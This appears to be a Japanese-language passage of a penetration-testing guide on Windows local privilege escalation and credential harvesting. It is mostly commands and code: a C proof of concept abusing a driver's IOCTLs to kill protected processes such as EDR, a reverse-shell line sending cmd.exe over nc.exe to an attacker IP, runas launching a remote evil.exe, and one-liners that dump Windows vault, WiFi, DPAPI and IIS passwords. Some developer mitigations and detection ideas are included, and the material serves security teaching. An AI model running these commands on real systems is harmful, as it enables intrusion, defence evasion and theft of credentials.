Windowsでは、serviceが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、binaryを指すように設定できます。このbinaryを置き換え可能な場合、privilege escalationが可能になることがあります。詳細については、[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（置き換えてprivilege escalationできる可能性があります）と、**フォルダの権限**（[DLL Hijacking](dll-hijacking/index.html)）を確認します。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

一部の設定ファイルを変更して特別なファイルを読み取れるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるかを確認します。

システム内で権限の弱いフォルダーやファイルを見つける方法は次のとおりです。
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は、`plugins` サブフォルダー内にあるすべての plugin DLL を自動的にロードします。書き込み可能な portable/copy install が存在する場合、悪意のある plugin を配置することで、起動するたびに `notepad++.exe` 内で自動的に code execution を実行できます（`DllMain` および plugin callbacks からの実行を含む）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別の user によって実行される registry または binary を上書きできるか確認します。**\
**以下の page を読んで、privilege escalation に利用できる興味深い **autoruns locations** の詳細を確認してください。**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**third party の奇妙な、または vulnerable な** drivers を探します。
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler でよく見られます）を公開している場合、kernel memory から SYSTEM token を直接窃取することで privilege escalation を実行できます。step-by-step の technique については、こちらを参照してください。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

vulnerable call が attacker-controlled Object Manager path を開く race-condition bug では、lookup を意図的に遅延させることで（最大長の component や深い directory chain を使用）、window を microseconds から数十 microseconds まで引き延ばせます。

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitive

Modern hive vulnerability では、決定論的な layout を groom し、書き込み可能な HKLM/HKU descendant を悪用して、custom driver なしで metadata corruption を kernel paged-pool overflow に変換できます。完全な chain については、こちらを参照してください。

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### attacker-controlled path による `RtlQueryRegistryValues` direct-mode type confusion

一部の driver は userland から registry path を受け取り、それが妥当な UTF-16 string であることだけを検証してから、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を、`int readValue` のような stack scalar に対して `RTL_QUERY_REGISTRY_DIRECT` とともに呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は開発者が想定した type ではなく、**実際の** registry type に従って解釈されます。

これにより、次の 2 つの有用な primitive が生じます。

- **Confused deputy / oracle**: user-controlled な absolute `\Registry\...` path により、driver は attacker が選択した key を query でき、return code/log を通じて存在を leak し、場合によっては caller が直接 access できない value も読み取れます。
- **Kernel memory corruption**: `&readValue` のような scalar destination は、registry value type に応じて `REG_QWORD`、`UNICODE_STRING`、または size 指定された binary buffer として type-confused になります。

実用的な exploitation notes:

- **Windows 8+ mitigation**: `RTL_QUERY_REGISTRY_DIRECT` を使用し、`RTL_QUERY_REGISTRY_TYPECHECK` を指定せずに **untrusted hive** を query すると、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` で crash します。exploitability を維持するには、`HKCU` の下に value を staging するのではなく、**trusted system hive 内の attacker-writable key** を探してください。
- **Trusted-hive staging**: NtObjectManager を使用して `\Registry\Machine` 配下の writable descendant を列挙し、duplicated **low-integrity** token で scan を再実行して、sandboxed context から到達可能な key を見つけます：
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4バイトの `int` への8バイトの直接書き込みにより、隣接するスタックデータが破壊され、近傍のcallback/function pointerを部分的に上書きできる。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext` が `UNICODE_STRING` を指していることを想定する。コードがまず攻撃者制御の `REG_DWORD` をスタックスカラーに読み込み、その後同じバッファを文字列読み取りに再利用すると、攻撃者が `Length` / `MaximumLength` を制御し、`Buffer` pointerにも部分的な影響を与えられるため、半制御のkernel writeが発生する。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは `EntryContext` にある最初の `LONG` を符号付きバッファサイズとして扱う。以前の `REG_DWORD` 読み取りによって、再利用されたスカラーに攻撃者制御の**負の値**が残っていると、次の `REG_BINARY` queryで攻撃者のバイト列が隣接するスタックスロットへ直接コピーされる。これは多くの場合、callback-pointerを完全に上書きする最も容易な経路となる。

強力なhunting pattern: **同じスタック変数への、再初期化を伴わない異種registry read**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される `EntryContext` pointers、および最初のregistry readによって2つ目のreadが実行されるかどうかが制御されるコードパスをGrepする。

#### device objectsでのFILE_DEVICE_SECURE_OPEN未設定の悪用 (LPE + EDR kill)

一部の署名済みthird-party driversは、IoCreateDeviceSecureを使用して強力なSDDLを設定したdevice objectを作成するものの、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れている。このflagがない場合、追加のcomponentを含むpathを通じてdeviceがopenされた際にsecure DACLが強制されないため、namespace pathに次のようなパスを使用することで、権限のないユーザーでもhandleを取得できる。

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例)

ユーザーがdeviceをopenできるようになると、driverが公開するprivileged IOCTLをLPEおよびtamperingに悪用できる。実環境で確認されたcapabilitiesの例:
- 任意のprocessへのfull-access handlesの返却 (token theft / DuplicateTokenEx/CreateProcessAsUserによるSYSTEM shell)。
- 制限のないraw disk read/write (offline tampering、boot-time persistence tricks)。
- Protected Process/Light (PP/PPL)を含む任意のprocessのterminate。これにより、kernel経由でuser landからAV/EDR killが可能になる。

最小PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けのMitigations
- DACLによる制限を意図したdevice objectを作成する場合は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作を行う前に、caller contextを検証する。process terminationやhandle returnsを許可する前に、PP/PPL checksを追加する。
- IOCTLs（access masks、METHOD_*、input validation）を制限し、kernel privilegesへの直接アクセスではなく、brokered modelsの採用を検討する。

defenders向けのDetection ideas
- 疑わしいdevice names（例：\\ .\\amsdk*）のuser-mode opensと、abuseを示す特定のIOCTL sequencesを監視する。
- Microsoftのvulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自のallow/deny listsを維持する。


## PATH DLL Hijacking

**PATH上に存在するfolder内へのwrite permissions**がある場合、processによってloadされるDLLをhijackし、**privilegesをescalate**できる可能性があります。

PATH内のすべてのfolderのpermissionsを確認します。
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
For more information about how to abuse this check:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron module resolution hijacking

これは、**Windows uncontrolled search path** の亜種であり、期待される module が **missing** の状態で、`require("foo")` のような bare import を実行する **Node.js** および **Electron** アプリケーションに影響します。

Node は directory tree を上方向にたどり、各 parent にある `node_modules` folder を確認して package を解決します。Windows では、この探索が drive root に到達する可能性があるため、`C:\Users\Administrator\project\app.js` から起動された application は、最終的に次の場所を確認することがあります。

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user** が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（または package folder）を配置し、**higher-privileged Node/Electron process** が missing dependency を解決するのを待つことができます。payload は victim process の security context で実行されるため、target が administrator として実行されている場合、elevated scheduled task/service wrapper から実行されている場合、または auto-start される privileged desktop app である場合、これは **LPE** になります。

これは、次のような場合に特によく発生します。

- dependency が `optionalDependencies` に宣言されている
- third-party library が `require("foo")` を `try/catch` で囲み、failure 時も処理を継続する
- production build から package が削除された、packaging 時に省略された、または install に失敗した
- vulnerable な `require()` が main application code ではなく dependency tree の深い場所に存在する

### 脆弱な target の Hunting

**Procmon** を使用して resolution path を確認します。

- `Process Name` = target executable（`node.exe`、Electron app EXE、または wrapper process）で filter
- `Path` が `node_modules` を `contains` する条件で filter
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最終的に成功する open に注目する

unpacked `.asar` files または application sources で役立つ code-review patterns：
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon またはソースレビューから **missing package name** を特定します。
2. まだ存在しない場合は、root lookup directory を作成します。
```powershell
mkdir C:\node_modules
```
3. 期待される正確な名前のモジュールを配置する:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者アプリケーションをトリガーする。アプリケーションが `require("foo")` を試行し、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに該当する、実際に見られる不足した optional module の例には `bluebird` と `utf-8-validate` があります。ただし、再利用可能な部分は **technique** です。つまり、特権 Windows Node/Electron プロセスが解決する **missing bare import** を見つけます。

### Detection and hardening ideas

- ユーザーが `C:\node_modules` を作成した場合、またはそこに新しい `.js` ファイルやパッケージを書き込んだ場合に Alert を発生させる。
- `C:\node_modules\*` から読み取っている high-integrity process を Hunt する。
- production ではすべての runtime dependencies をパッケージ化し、`optionalDependencies` の使用状況を Audit する。
- third-party code に、`try { require("...") } catch {}` のような silent なパターンがないか Review する。
- library が対応している場合は optional probe を無効化する（たとえば、一部の `ws` deployments では `WS_NO_UTF_8_VALIDATE=1` により legacy の `utf-8-validate` probe を回避できる）。

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hostsファイル

hostsファイルにハードコードされている、その他の既知のコンピューターを確認します。
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースと DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から **制限されたサービス** を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォール関連のコマンドについては、このページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化...）**

[ネットワーク列挙用のその他のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (WSL)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すると、任意のポートで listen できます（初めて `nc.exe` を使用してポートを listen すると、`nc` を firewall で許可するかどうかを GUI で尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
rootとしてbashを簡単に起動するには、`--default-user root`を試せます。

`WSL`のファイルシステムは、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`フォルダーで確認できます。

## Windows認証情報

### Winlogon認証情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、**Windows** がユーザーを**自動的にログインさせられる**サーバー、Webサイト、その他のプログラムのユーザー認証情報を保存します。最初は、ユーザーが Facebook、Twitter、Gmail などの認証情報を保存して、ブラウザ経由で自動的にログインできるようになったように思えるかもしれません。しかし、実際はそうではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせられる認証情報を保存します。つまり、**リソース（サーバーまたはWebサイト）にアクセスするために認証情報を必要とする Windows application** は、この Credential Manager と Windows Vault を利用し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の認証情報を利用することはできないと思います。したがって、アプリケーションで vault を利用する場合は、何らかの方法で**credential manager と通信し、デフォルトの保存 vault からそのリソースの認証情報を要求する**必要があります。

`cmdkey` を使用して、マシンに保存されている認証情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された認証情報を使用するために、`/savecred` オプションを指定して `runas` を使用できます。以下の例では、SMB share 経由で remote binary を呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された認証情報セットで `runas` を使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)から取得できることに注意してください。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文パスワードを Universal Windows Platform（UWP）の `PasswordVault`（`vaultcmd` では `Web Credentials` としても表示されます）内に保存します。このストレージ領域はセッション単位で分離されており、管理者権限や `SeDebugPrivilege` 権限がなくてもネイティブに復号できます。

ユーザーのアクティブなセッション内で次の PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座に dump して復号できます:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; v = New-Object Windows.Security.Credentials.PasswordVault; v.RetrieveAll() | ForEach-Object { try { \(_.RetrievePassword();\)_ } catch{} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API（DPAPI）**は、主にWindows operating system内で非対称秘密鍵を対称暗号化するために使用される、データの対称暗号化手段を提供します。この暗号化では、ユーザーまたはシステムのsecretを利用して、entropyに大きく寄与させます。

**DPAPIは、ユーザーのlogin secretsから導出された対称鍵を通じて鍵を暗号化します**。システム暗号化の場合は、システムのdomain authentication secretsを使用します。

DPAPIを使用して暗号化されたユーザーRSA鍵は、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに保存されます。ここで`{SID}`はユーザーの[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**ユーザーの秘密鍵を保護するmaster keyと同じファイル内に併置されたDPAPI key**は、通常64バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMDで`dir`コマンドを使用して内容を一覧表示することはできませんが、PowerShellでは一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatz module** `dpapi::masterkey` に適切な引数（`/pvk` または `/rpc`）を指定して、復号できます。

**master password で保護された credentials files** は通常、次の場所にあります：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
`mimikatz module` `dpapi::cred` と適切な `/masterkey` を使用して復号できます。\
`sekurlsa::dpapi` module を使用すると、**memory** から多数の **DPAPI** **masterkeys** を **extract** できます（root の場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された credentials を便利に保存する方法として、**scripting** や自動化タスクでよく使用されます。credentials は **DPAPI** を使用して保護されます。通常、作成されたのと同じコンピューター上で、同じユーザーだけが復号できます。

credentials を含むファイルから PS credentials を **decrypt** するには、次のようにします。
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WiFi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモート デスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
`/masterkey`を適切に指定して、**Mimikatz**の`dpapi::rdg`モジュールを使用し、**任意の.rdgファイルを復号**\
Mimikatzの`sekurlsa::dpapi`モジュールを使用すると、メモリから**多数のDPAPI masterkeysを抽出**できます

### Sticky Notes

Windowsワークステーションでは、**パスワード**やその他の情報を保存するためにSticky Notesアプリが使用されることがよくありますが、これはデータベースファイルであることが認識されていない場合があります。このファイルは`C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`に保存されており、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exeからパスワードを復元するには、Administrator権限が必要で、High Integrityレベルで実行する必要があります。**\
**AppCmd.exe**は`%systemroot%\system32\inetsrv\`ディレクトリにあります。\
このファイルが存在する場合、**credentials**が設定されており、**復元できる**可能性があります。

このコードは[**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)から抽出されたものです：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
Installer は **SYSTEM privileges で実行され**、多くが **DLL Sideloading に対して脆弱です（情報元: ** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（認証情報）

### Puttyの認証情報
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内のSSH keys

SSH private keysはレジストリ key `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されている可能性があるため、そこに何か興味深いものがないか確認してください。
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH key です。暗号化された状態で保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用すれば簡単に復号できます。\
この technique の詳細については、こちらを参照してください: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service が実行されておらず、boot 時に自動的に起動させたい場合は、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。いくつかの SSH keys を作成し、`ssh-add` で追加してから、SSH 経由でマシンにログインしてみました。しかし、レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも非対称鍵認証中に `dpapi.dll` が使用されたことを確認できませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit** を使用して、これらのファイルを検索することもできます: _post/windows/gather/enum_unattend_

内容の例:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM と SYSTEM のバックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** というファイルを検索します。

### Cached GPP Pasword

以前は、Group Policy Preferences (GPP) を介して、カスタムのローカル administrator account を複数のマシンに展開できる機能がありました。しかし、この方法には重大な security flaw がありました。第一に、SYSVOL に XML files として保存された Group Policy Objects (GPOs) には、すべての domain user がアクセスできました。第二に、公開されている default key を使用して AES256 で暗号化された、これらの GPP 内の password は、認証済みのすべての user が復号できました。これは、user が elevated privileges を取得できる可能性があるため、深刻な risk となりました。

この risk を軽減するため、空でない `"cpassword"` field を含む、locally cached GPP files を検索する function が開発されました。そのような file が見つかると、function は password を復号し、custom PowerShell object を返します。この object には、GPP と file の location に関する details が含まれており、この security vulnerability の特定と remediation に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista より前)_ で、以下の files を検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
